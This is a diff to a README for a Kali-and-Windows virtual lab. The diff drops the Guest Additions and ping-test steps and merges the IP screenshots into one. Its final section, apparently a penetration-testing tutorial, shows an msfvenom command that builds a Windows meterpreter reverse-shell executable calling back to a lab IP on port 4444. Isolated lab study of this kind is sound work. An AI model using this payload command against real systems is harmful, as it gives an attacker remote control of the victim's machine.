@@ -66,35 +66,17 @@ Set both VMs to the **Internal Newtwork** to allow isolated communication.
 Use `ip a` on Kali and `ipconfig` on Windows to confirm both VMs are on the same subnet.
 
 📸 *Screenshot Example:*  
-![Kali IP](./screenshots/kali-ip.png)  
-![Windows IP](./screenshots/windows-ip.png)
+![Kali and Windows IP](./screenshots/kali_ping_windows.png)  
 
 ---
 
-### 5. Install Guest Additions (Windows Only)
-
-Fix resolution on Windows VM by installing Guest Additions.
-
-📸 *Screenshot Example:*  
-![Guest Additions](./screenshots/guest-additions.png)
-
----
-
-### 6. Test Connectivity
-
-Ping each machine from the other to confirm they’re connected.
-
-📸 *Screenshot Example:*  
-![Ping Test](./screenshots/ping-test.png)
-
----
-
-### 7. Generate & Deploy Payload (Optional Preview)
+### 5. Generate & Deploy Payload (Optional Preview)
 
 In later parts, we generate a reverse shell using `msfvenom`:
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=4444 -f exe > shell.exe
+
 
 
 
